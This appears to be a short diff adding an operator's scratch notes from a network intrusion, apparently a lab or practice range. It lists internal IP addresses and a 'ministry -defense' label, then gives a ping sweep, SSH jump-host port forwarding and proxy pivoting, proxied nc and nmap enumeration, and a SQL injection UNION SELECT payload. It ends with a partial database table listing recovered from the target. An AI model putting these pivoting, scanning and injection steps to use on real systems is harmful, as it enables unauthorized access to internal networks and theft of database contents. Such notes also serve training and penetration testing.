@@ -1,1 +1,27 @@
+10.50.22.148:8000
+10.50.28.159 --- 
+ministry -defense
+
+==========================================
+for i in {1..254}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done
+ssh -S /tmp/jump jump -O forward -D 9050
+proxychains nc 192.168.28.100 80
+ssh -S /tmp/jump jump -O forward -L 1111:192.168.28.100:80 -L 2222:192.168.100:2222 -L 3333:192.168.28:111 -L 5555:192.168.28.111:2222
+ssh -MS /tmp/t1 creds@127.0.0.1 -p 2222
+ssh -S /tmp/t1 t1 -O forward 9050
+proxychains nmap --script=http-enum.nse 192.168.28.100
+UNION SELECT table_schema,table_name,column_name from information_schema.columns #
+nmap -Pn -sT -T4
+
+
+=========================================
+
+siteusers
+    custumer
+        id
+        name
+        ahdajfh
+    net_produ
+        jjdashf
+        jdjbvabvj
 
